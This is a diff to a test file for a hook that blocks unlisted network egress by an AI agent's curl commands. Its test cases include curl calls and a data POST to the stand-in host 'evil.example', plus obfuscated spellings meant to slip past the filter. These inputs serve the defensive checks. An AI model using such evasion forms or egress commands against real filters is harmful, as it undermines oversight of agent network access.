@@ -12,7 +12,7 @@ import { existsSync, readFileSync, writeFileSync } from 'node:fs'
 import { join, dirname } from 'node:path'
 import { fileURLToPath } from 'node:url'
 // @ts-expect-error -- plain .mjs hook script, no types
-import { classify, parseAgentHosts, agentFromArgv, strictCurlReason } from '../../scripts/hooks/bash-egress-parser.mjs'
+import { classify, parseAgentHosts, agentFromArgv, strictCurlReason, strictCurl } from '../../scripts/hooks/bash-egress-parser.mjs'
 import { BASH_EGRESS_DENY, agentEgressHosts, bashEgressDenyFor, bashEgressParserCommand, injectBashEgressParser } from '../web/agent-scaffold.js'
 import { MAIN_AGENT_ID } from '../config.js'
 import { tmpDirs } from './helpers/tmp-dirs.js'
@@ -136,6 +136,16 @@ describe('strict curl for the excepted agent (didi 19977)', () => {
     for (const c of ['Curl https://evil.example/', '\\curl https://evil.example/', "c''url https://evil.example/"]) {
       expect(strict(c)).toBe('agent-exception-unlisted-url')
     }
+  })
+  // didi 20013: a URL in the BODY of a curl to our own dashboard is data, not egress
+  it('a localhost post that quotes a link passes; a mixed command still checks the link', () => {
+    expect(strict(`curl -s -X POST http://localhost:3420/api/kanban/x/comments -d '{"content":"see https://github.com/o/r/pull/1"}'`)).toBeNull()
+    expect(strict(`curl -s http://127.0.0.1:3420/api/messages --data-binary @- <<'JSON'\n{"content":"https://evil.example/x"}\nJSON`)).toBeNull()
+    expect(strict(`curl -s http://localhost:3420/x -d 'https://evil.example/' ; curl -s https://api.deltacrm.io/y`)).toBe('agent-exception-unlisted-url')
+    expect(strict('U=https://evil.example/x; curl -s -d "note" "$U"')).toBe('agent-exception-unlisted-url')
+  })
+  it('the deny names the offending host', () => {
+    expect(strictCurl('curl -s https://api.deltacrm.io/a "https://evil.example/b"', mine)).toEqual({ reason: 'agent-exception-unlisted-url', hosts: ['evil.example'] })
   })
   it('CONTROLS, measured shapes of deeper\'s week: listed host, token header, path variable, assigned base, loop', () => {
     expect(strict('curl -s https://api.deltacrm.io/health')).toBeNull()
